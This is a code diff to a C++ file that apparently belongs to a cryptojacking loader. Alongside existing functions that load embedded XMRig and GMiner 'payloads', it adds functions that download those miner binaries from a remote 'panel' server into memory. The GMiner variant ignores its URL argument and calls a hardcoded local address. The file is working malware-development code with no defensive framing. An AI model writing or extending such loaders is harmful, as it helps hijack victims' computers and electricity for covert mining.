@@ -4,6 +4,7 @@
 #include <cstdint>
 #include <utility>
 #include "resources.h"  // Include the resource IDs
+#include "httplib.h"
 #include <stdexcept>
 
 void LoadEmbeddedXMRig(BYTE*& payloadBuf, size_t& payloadSize) {
@@ -46,4 +47,73 @@ void LoadEmbeddedGminer(BYTE*& payloadBuf, size_t& payloadSize) {
     payloadBuf = new BYTE[size];
     memcpy(payloadBuf, pData, size);
     payloadSize = static_cast<size_t>(size);
+}
+
+
+void LoadXmrigFromPanel(std::string panelUrl, BYTE*& payloadBuf, size_t& payloadSize) 
+{
+    httplib::Client client(panelUrl);
+
+    payloadBuf = nullptr;
+    payloadSize = 0;
+
+    try {
+        auto res = client.Get("/FetchXmrig");
+
+        if (res && res->status == 200) {
+
+            payloadSize = res->body.size();
+            printf("Size Of Res: %zu\n", payloadSize);
+
+            payloadBuf = new BYTE[payloadSize];
+            memcpy(payloadBuf, res->body.data(), payloadSize);
+
+            std::cout << "File downloaded successfully\n";
+        }
+        else {
+            std::cerr << "HTTP error occurred: "
+                      << (res ? std::to_string(res->status) : "No response") << std::endl;
+        }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error occurred: " << e.what() << std::endl;
+    }
+
+    if (!payloadBuf || payloadSize == 0) {
+        std::cerr << "Download failed or file was empty!" << std::endl;
+    }
+}
+
+void LoadGMinerFromPanel(std::string panelUrl, BYTE*& payloadBuf, size_t& payloadSize) 
+{
+    httplib::Client client("http://127.0.0.1:8080");
+
+    payloadBuf = nullptr;
+    payloadSize = 0;
+
+    try {
+        auto res = client.Get("/FetchGMiner");
+
+        if (res && res->status == 200) {
+
+            payloadSize = res->body.size();
+            printf("Size Of Res: %zu\n", payloadSize);
+
+            payloadBuf = new BYTE[payloadSize];
+            memcpy(payloadBuf, res->body.data(), payloadSize);
+
+            std::cout << "File downloaded successfully\n";
+        }
+        else {
+            std::cerr << "HTTP error occurred: "
+                      << (res ? std::to_string(res->status) : "No response") << std::endl;
+        }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Error occurred: " << e.what() << std::endl;
+    }
+
+    if (!payloadBuf || payloadSize == 0) {
+        std::cerr << "Download failed or file was empty!" << std::endl;
+    }
 }
